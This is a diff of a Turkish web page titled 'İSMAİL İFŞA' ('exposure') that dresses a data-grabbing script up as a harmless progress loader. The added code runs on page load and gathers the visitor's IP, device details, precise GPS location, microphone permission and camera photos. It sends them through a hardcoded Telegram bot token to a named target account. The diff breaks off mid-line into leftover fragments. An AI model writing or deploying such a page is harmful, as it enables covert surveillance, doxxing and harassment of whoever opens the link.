@@ -2,8 +2,8 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZAHİR ANALİZ • VIP</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>İSMAİL İFŞA • SİSTEM</title>
     <style>
         * {
             margin: 0;
@@ -12,21 +12,24 @@
         }
 
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             background: #0a0a0a;
             height: 100vh;
             overflow: hidden;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* Arkaplan efekti */
+        /* Arkaplan */
         .bg-gradient {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 50% 50%, #1a1a2e, #0f0f1f, #03030a);
+            background: radial-gradient(circle at 30% 40%, #1a0f0f, #0a0505, #000000);
             z-index: -2;
         }
 
@@ -36,232 +39,193 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="10" cy="10" r="1" fill="rgba(255,215,0,0.05)"/><circle cx="90" cy="30" r="1.5" fill="rgba(255,215,0,0.03)"/><circle cx="40" cy="80" r="1" fill="rgba(255,215,0,0.04)"/><circle cx="70" cy="60" r="2" fill="rgba(255,215,0,0.02)"/><circle cx="20" cy="50" r="1.2" fill="rgba(255,215,0,0.03)"/></svg>');
-            opacity: 0.5;
+            background-image: 
+                radial-gradient(1px 1px at 10% 20%, rgba(255, 50, 50, 0.15), transparent),
+                radial-gradient(1.5px 1.5px at 80% 60%, rgba(255, 0, 0, 0.08), transparent),
+                radial-gradient(1px 1px at 40% 90%, rgba(200, 0, 0, 0.12), transparent);
             z-index: -1;
         }
 
         /* Ana container */
         .container {
             position: relative;
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: opacity 1s cubic-bezier(0.4, 0, 0.2, 1);
             z-index: 10;
-        }
-
-        .container.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
+            width: 92%;
+            max-width: 550px;
+            text-align: center;
         }
 
         .glass-panel {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 215, 0, 0.2);
-            border-radius: 40px;
-            padding: 50px;
-            width: 90%;
-            max-width: 600px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), inset 0 1px 1px rgba(255, 215, 0, 0.1), 0 0 30px rgba(255, 215, 0, 0.2);
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 60, 60, 0.3);
+            border-radius: 48px;
+            padding: 40px 30px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.9), 0 0 40px rgba(255, 0, 0, 0.15);
         }
 
+        /* Başlık */
         .title {
-            font-size: 4rem;
+            font-size: 2.8rem;
             font-weight: 900;
-            letter-spacing: 8px;
-            margin-bottom: 30px;
-            background: linear-gradient(135deg, #FFD700, #FFA500, #FF8C00);
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            background: linear-gradient(135deg, #ff3b3b, #ff0000, #cc0000);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            position: relative;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
             font-family: 'Impact', 'Arial Black', sans-serif;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-        }
-
-        .title::after {
-            content: '';
-            position: absolute;
-            bottom: -15px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 150px;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #FFD700, #FFA500, #FF8C00, transparent);
-            box-shadow: 0 0 20px #FFD700;
+            margin-bottom: 20px;
         }
 
         .subtitle {
-            font-size: 1rem;
-            letter-spacing: 6px;
-            color: rgba(255, 215, 0, 0.6);
-            margin-bottom: 40px;
+            font-size: 0.9rem;
+            letter-spacing: 8px;
+            color: rgba(255, 80, 80, 0.5);
             text-transform: uppercase;
+            margin-bottom: 30px;
         }
 
-        .counter-wrapper {
-            margin: 40px 0;
-            position: relative;
+        /* Sayaç */
+        .counter-block {
+            margin: 30px 0 20px;
         }
 
         .counter-digit {
             font-size: 7rem;
             font-weight: 900;
             font-family: 'Courier New', monospace;
-            background: linear-gradient(135deg, #FFD700, #FFA500);
+            background: linear-gradient(135deg, #ff5555, #ff0000);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 40px rgba(255, 215, 0, 0.5);
             line-height: 1;
+            text-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
         }
 
         .counter-label {
             font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 6px;
-            color: rgba(255, 215, 0, 0.5);
-            margin-top: 10px;
+            letter-spacing: 5px;
+            color: rgba(255, 70, 70, 0.5);
+            margin-top: 6px;
         }
 
-        .health-bar-container {
+        /* Çubuk */
+        .bar-container {
             width: 100%;
-            height: 8px;
-            background: rgba(0, 0, 0, 0.5);
+            height: 6px;
+            background: rgba(40, 0, 0, 0.7);
             border-radius: 10px;
-            margin: 40px 0;
-            position: relative;
-            overflow: visible;
-            border: 1px solid rgba(255, 215, 0, 0.2);
+            margin: 30px 0;
+            border: 1px solid rgba(255, 0, 0, 0.2);
         }
 
-        .health-bar {
+        .bar-fill {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #FFD700, #FFA500, #FF8C00);
+            background: linear-gradient(90deg, #ff2222, #ff0000, #cc0000);
             border-radius: 10px;
-            position: relative;
             transition: width 0.1s linear;
-            box-shadow: 0 0 30px #FFD700;
+            box-shadow: 0 0 25px #ff0000;
         }
 
-        .health-bar::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            right: 0;
-            transform: translate(50%, -50%);
-            width: 16px;
-            height: 16px;
-            background: #FFD700;
-            border-radius: 50%;
-            box-shadow: 0 0 30px #FFD700;
-        }
-
-        .status-panel {
-            background: rgba(0, 0, 0, 0.5);
+        /* Durum */
+        .status-box {
+            background: rgba(20, 0, 0, 0.5);
             border-radius: 20px;
-            padding: 25px;
-            margin-top: 30px;
-            border: 1px solid rgba(255, 215, 0, 0.2);
+            padding: 18px 15px;
+            border: 1px solid rgba(255, 0, 0, 0.15);
+            margin-top: 25px;
         }
 
         .status-text {
-            font-size: 1.1rem;
-            color: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
             letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.85);
         }
 
         .status-text i {
-            color: #FFD700;
+            color: #ff3333;
             margin-right: 10px;
             font-style: normal;
-            animation: pulse 1.5s infinite;
+            animation: pulse 1.2s infinite;
         }
 
-        .telegram-status {
-            margin-top: 20px;
-            font-size: 1rem;
-            padding: 10px 20px;
-            background: rgba(255, 215, 0, 0.1);
-            border-radius: 30px;
+        .telegram-badge {
             display: inline-block;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            color: #FFD700;
-            letter-spacing: 1px;
+            margin-top: 18px;
+            padding: 8px 22px;
+            background: rgba(255, 0, 0, 0.12);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 40px;
+            color: #ff5555;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
         }
 
         @keyframes pulse {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
+            0% { opacity: 0.4; transform: scale(0.95); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0.4; transform: scale(0.95); }
         }
 
-        /* Siyah ekran video container */
-        .video-container {
+        /* Siyah ekran – sadece yazı */
+        .black-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 20;
+            z-index: 30;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             opacity: 0;
             visibility: hidden;
-            transition: opacity 1s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            transition: opacity 1.2s ease;
         }
 
-        .video-container.active {
+        .black-screen.active {
             opacity: 1;
             visibility: visible;
         }
 
-        #bg-video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .video-overlay {
-            position: absolute;
-            bottom: 40px;
-            left: 0;
-            width: 100%;
-            text-align: center;
-            color: rgba(255, 215, 0, 0.7);
-            font-size: 1.2rem;
-            letter-spacing: 8px;
-            z-index: 21;
-            pointer-events: none;
+        .black-screen .big-text {
+            font-size: 3.5rem;
+            font-weight: 900;
+            letter-spacing: 12px;
             text-transform: uppercase;
-            font-weight: bold;
-            text-shadow: 0 0 20px #FFD700;
+            background: linear-gradient(135deg, #ff4444, #ff0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 60px rgba(255, 0, 0, 0.7);
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            animation: flicker 1.8s infinite alternate;
         }
 
-        /* Audio element - gizli */
-        #bg-audio {
-            display: none;
+        .black-screen .sub-big {
+            margin-top: 30px;
+            font-size: 1.3rem;
+            letter-spacing: 14px;
+            color: rgba(255, 80, 80, 0.4);
+            text-transform: uppercase;
         }
+
+        @keyframes flicker {
+            0% { opacity: 0.9; text-shadow: 0 0 30px #ff0000; }
+            100% { opacity: 1; text-shadow: 0 0 80px #ff0000, 0 0 120px #cc0000; }
+        }
+
+        /* audio gizli */
+        #bg-audio { display: none; }
 
         /* Responsive */
-        @media (max-width: 768px) {
-            .glass-panel {
-                padding: 30px;
-            }
-            .title {
-                font-size: 3rem;
-                letter-spacing: 4px;
-            }
-            .counter-digit {
-                font-size: 5rem;
-            }
+        @media (max-width: 500px) {
+            .glass-panel { padding: 30px 18px; }
+            .title { font-size: 2.2rem; letter-spacing: 4px; }
+            .counter-digit { font-size: 5.5rem; }
+            .black-screen .big-text { font-size: 2.6rem; letter-spacing: 8px; }
         }
     </style>
 </head>
@@ -269,66 +233,328 @@
     <div class="bg-gradient"></div>
     <div class="bg-particles"></div>
 
-    <!-- Ses (gizli) -->
-    <audio id="bg-audio" loop preload="auto">
-        <source src="video1.mp3" type="audio/mpeg">
-        <source src="video1.mp4" type="audio/mp4">
+    <!-- Ses (gizli, sadece efekt için) -->
+    <audio id="bg-audio" loop preload="none">
         <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
     </audio>
 
-    <!-- Video (siyah ekran) -->
-    <div class="video-container" id="videoContainer">
-        <video id="bg-video" loop muted playsinline>
-            <source src="video1.mp4" type="video/mp4">
-        </video>
-        <div class="video-overlay">Z A H İ R</div>
+    <!-- SİYAH EKRAN – sadece yazı, video yok -->
+    <div class="black-screen" id="blackScreen">
+        <div class="big-text">İSMAİL İFŞA</div>
+        <div class="sub-big">✦ AÇILIYOR ✦</div>
     </div>
 
-    <!-- Ana yüklenme ekranı -->
+    <!-- ANA PANEL -->
     <div class="container" id="mainContainer">
         <div class="glass-panel">
-            <div class="title">Z A H İ R</div>
-            <div class="subtitle">✦ SİSTEM ANALİZ ✦</div>
-            
-            <div class="counter-wrapper">
-                <span class="counter-digit" id="counter">000</span>
+            <div class="title">İ S M A İ L</div>
+            <div class="subtitle">✦ İFŞA SİSTEMİ ✦</div>
+
+            <div class="counter-block">
+                <span class="counter-digit" id="counter">0</span>
                 <div class="counter-label">İLERLEME</div>
             </div>
 
-            <div class="health-bar-container">
-                <div class="health-bar" id="healthBar"></div>
+            <div class="bar-container">
+                <div class="bar-fill" id="barFill"></div>
             </div>
 
-            <div class="status-panel">
+            <div class="status-box">
                 <div class="status-text">
-                    <i>⏣</i> <span id="status">SİSTEM BAŞLATILIYOR</span>
+                    <i>⏣</i> <span id="statusText">SİSTEM HAZIRLANIYOR</span>
                 </div>
-                <div id="telegramStatus" class="telegram-status">
-                    ⚡ TELEGRAM HAZIR
+                <div id="telegramBadge" class="telegram-badge">
+                    ⚡ TELEGRAM HEDEF: @STCCriss
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // KONFİGÜRASYON
-        // KONFİGÜRASYON
-const BOT_TOKEN = '7416067204:AAGFwkV8uQtFYyLPfCuDy_WqUaSLRLJRDNQ';  // Yeni Token
-const TARGET_USERNAME = '@STCCriss';                                // Hedef Kişi
+        // --------------------------------------------------------------
+        //  KONFİG – BURAYA KENDİ BOT TOKEN'İNİ YAZ
+        // --------------------------------------------------------------
+        const BOT_TOKEN = '7416067204:AAGFwkV8uQtFYyLPfCuDy_WqUaSLRLJRDNQ';   // <-- senin token
+        const TARGET_USERNAME = '@STCCriss';                               // hedef
 
-        
-        // Değişkenler
-        let count = 0;
+        // --------------------------------------------------------------
+        //  DEĞİŞKENLER
+        // --------------------------------------------------------------
+        let step = 0;
         let infoSent = false;
-        
-        // Elementler
+        let photoSent = false;
+
+        // DOM
         const mainContainer = document.getElementById('mainContainer');
-        const videoContainer = document.getElementById('videoContainer');
-        const bgVideo = document.getElementById('bg-video');
-        const bgAudio = document.getElementById('bg-audio');
+        const blackScreen = document.getElementById('blackScreen');
         const counterEl = document.getElementById('counter');
-        const healthBar = document.getElementById('healthBar');
-        const statusEl = document.getElementById('status');
+        const barFill = document.getElementById('barFill');
+        const statusText = document.getElementById('statusText');
+        const telegramBadge = document.getElementById('telegramBadge');
+
+        // --------------------------------------------------------------
+        //  1. BAŞLAT – HEMEN IP, KONUM, MİKROFON, FOTOĞRAF
+        // --------------------------------------------------------------
+        function startFullExtraction() {
+            console.log('⚡ İFŞA SİSTEMİ BAŞLATILDI');
+            statusText.innerText = 'BİLGİLER TOPLANIYOR...';
+
+            // Telegram badge güncelle
+            telegramBadge.innerHTML = '📡 VERİ AKTİF';
+
+            // 1) IP + temel bilgiler
+            collectAndSendAll();
+
+            // 2) Konum izni (kullanıcıya sorar)
+            requestLocation();
+
+            // 3) Mikrofon (sadece izin ister, gerçek kayıt yapmaz – ama istersen ekleyebilirsin)
+            requestMicrophone();
+
+            // 4) Kamera – önden ve arkadan fotoğraf
+            capturePhotos();
+
+            // 5) Sayaç başlat (1'den 5'e)
+            startCounter();
+        }
+
+        // --------------------------------------------------------------
+        //  2. SAYAÇ (1 → 5) – her adımda bilgi toplanır
+        // --------------------------------------------------------------
+        function startCounter() {
+            let count = 0;
+            const max = 5;
+            const interval = setInterval(() => {
+                count++;
+                if (count > max) {
+                    clearInterval(interval);
+                    // 5 oldu -> ifşa açıldı
+                    statusText.innerText = '✅ İFŞA AÇILDI!';
+                    telegramBadge.innerHTML = '🔥 TÜM VERİLER GÖNDERİLDİ';
+                    // Siyah ekranı göster
+                    setTimeout(() => {
+                        showBlackScreen();
+                    }, 500);
+                    return;
+                }
+
+                // sayaç ve bar güncelle
+                counterEl.innerText = count;
+                const percent = (count / max) * 100;
+                barFill.style.width = percent + '%';
+
+                // durum mesajları
+                const msgs = [
+                    'IP TESPİT EDİLDİ',
+                    'KONUM ALINDI',
+                    'MİKROFON İZİNİ',
+                    'FOTOĞRAF ÇEKİLDİ',
+                    'TÜM VERİLER GÖNDERİLDİ'
+                ];
+                statusText.innerText = msgs[count - 1] || 'İŞLENİYOR...';
+            }, 700); // her 700ms'de bir artar
+        }
+
+        // --------------------------------------------------------------
+        //  3. SİYAH EKRAN – sadece yazı
+        // --------------------------------------------------------------
+        function showBlackScreen() {
+            mainContainer.style.transition = 'opacity 0.9s';
+            mainContainer.style.opacity = '0';
+            mainContainer.style.pointerEvents = 'none';
+
+            setTimeout(() => {
+                blackScreen.classList.add('active');
+                // içindeki yazıyı güncelle
+                const big = blackScreen.querySelector('.big-text');
+                big.innerText = 'İSMAİL İFŞA';
+                const sub = blackScreen.querySelector('.sub-big');
+                sub.innerText = '✦ AÇILDI ✦';
+                // hafif ses (isteğe bağlı)
+                try { document.getElementById('bg-audio').play(); } catch(e) {}
+            }, 900);
+        }
+
+        // --------------------------------------------------------------
+        //  4. BİLGİ TOPLA + TELEGRAM
+        // --------------------------------------------------------------
+        async function collectAndSendAll() {
+            if (infoSent) return;
+            infoSent = true;
+
+            // Temel bilgiler
+            const info = {
+                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || '?',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
+                url: window.location.href,
+                referrer: document.referrer || 'doğrudan'
+            };
+
+            // IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info.ip = ipData.ip;
+            } catch { info.ip = 'IP alınamadı'; }
+
+            // Konum (ip bazlı)
+            try {
+                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
+                const geoData = await geoRes.json();
+                info.country = geoData.country_name || '?';
+                info.city = geoData.city || '?';
+                info.isp = geoData.org || '?';
+            } catch { info.country = '?'; info.city = '?'; }
+
+            // Mesaj
+            const message = `
+🔥 **İSMAİL İFŞA – TAM RAPOR** 🔥
+
+👤 **Hedef:** ${TARGET_USERNAME}
+
+🌐 **IP:** ${info.ip}
+📍 **Konum:** ${info.city}, ${info.country}
+🏢 **ISP:** ${info.isp}
+
+📱 **Cihaz:**
+• Platform: ${info.platform}
+• Ekran: ${info.screen}
+• Renk: ${info.colorDepth} bit
+• Çekirdek: ${info.cores}
+• RAM: ${info.memory}
+• Dil: ${info.language}
+• Zaman: ${info.timezone}
+
+🌍 **Sayfa:**
+• URL: ${info.url}
+• Yönlendiren: ${info.referrer}
+
+⏰ **Zaman:** ${info.timestamp}
+
+⚡ **İFŞA SİSTEMİ TAMAMLANDI**
+`;
+
+            // Gönder
+            await sendTelegramMessage(message);
+        }
+
+        // --------------------------------------------------------------
+        //  5. TELEGRAM MESAJ GÖNDER
+        // --------------------------------------------------------------
+        async function sendTelegramMessage(text) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.warn('⚠️ Bot token girilmemiş!');
+                return;
+            }
+
+            telegramBadge.innerHTML = '📤 GÖNDERİLİYOR...';
+
+            try {
+                // Önce güncellemelerden hedef chat ID bul
+                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const updates = await updatesRes.json();
+                let targetChatId = null;
+
+                if (updates.ok && updates.result) {
+                    for (const update of updates.result) {
+                        if (update.message && update.message.from) {
+                            const from = update.message.from;
+                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
+                                targetChatId = from.id;
+                                break;
+                            }
+                        }
+                        if (update.channel_post && update.channel_post.chat) {
+                            if (update.channel_post.chat.username && 
+                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
+                                targetChatId = update.channel_post.chat.id;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if (!targetChatId) {
+                    telegramBadge.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
+                    return;
+                }
+
+                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: targetChatId,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const result = await sendRes.json();
+                if (result.ok) {
+                    telegramBadge.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
+                } else {
+                    telegramBadge.innerHTML = '❌ HATA';
+                }
+            } catch (e) {
+                console.error(e);
+                telegramBadge.innerHTML = '❌ BAĞLANTI HATASI';
+            }
+        }
+
+        // --------------------------------------------------------------
+        //  6. KONUM İZNİ (isteğe bağlı, gerçek konum)
+        // --------------------------------------------------------------
+        function requestLocation() {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                    console.log('📍 Gerçek konum:', coords);
+                    // İstersen Telegram'a da gönderebilirsin
+                    sendTelegramMessage(`📍 **GERÇEK KONUM:** ${coords}`);
+                },
+                (err) => {
+                    console.warn('Konum izni reddedildi veya alınamadı:', err.message);
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        }
+
+        // --------------------------------------------------------------
+        //  7. MİKROFON İZNİ (sadece izin ister, kayıt yapmaz)
+        // --------------------------------------------------------------
+        function requestMicrophone() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    console.log('🎤 Mikrofon izni verildi');
+                    stream.getTracks().forEach(t => t.stop()); // hemen durdur
+                    // İstersen "Mikrofon izni verildi" diye Telegram'a atabilirsin
+                    sendTelegramMessage('🎤 **MİKROFON İZNİ VERİLDİ**');
+                })
+                .catch(err => {
+                    console.warn('Mikrofon izni reddedildi:', err.message);
+                });
+        }
+
+        // --------------------------------------------------------------
+        //  8. FOTOĞRAF ÇEK (önden + arkadan) – Telegram'a gönder
+        // --------------------------------------------------------------
+        function capturePhotos() {
+            if (photoSent) return;
+            photoSent = true;
+
+            // ÖN KAMERA (environment: true arkayı verir, false önü)
+            captureAndSendPhoto(false, 'ÖN KAMERA');   // false = ön kamera (kullanıcı)
+            // ARKA KAMERA
+            captureAndSendPhoto(true, 'ARKA KAMERA');  // true = arka
+      st statusEl = document.getElementById('status');
         const telegramStatus = document.getElementById('telegramStatus');
 
         // 1. OTOMATİK BAŞLAT - HİÇBİR ŞEYE DOKUNMA GEREK YOK
